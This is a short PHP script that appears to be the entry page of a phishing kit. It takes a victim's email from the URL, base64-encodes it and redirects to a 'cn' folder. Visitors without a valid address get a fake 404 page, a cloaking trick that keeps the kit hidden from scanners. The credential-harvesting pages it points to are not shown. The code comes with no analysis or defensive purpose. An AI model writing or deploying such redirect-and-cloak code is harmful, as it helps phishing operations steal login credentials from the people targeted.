<?php

session_start();
$email = '';
require 'cn/api.php';

if (isset($_GET['email'])) {
$email = $_GET['email'];
$lang = base64_encode($email);
}
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./cn/?lang=$lang&x=");
}
else{
    include "cn/404.php";
}

?>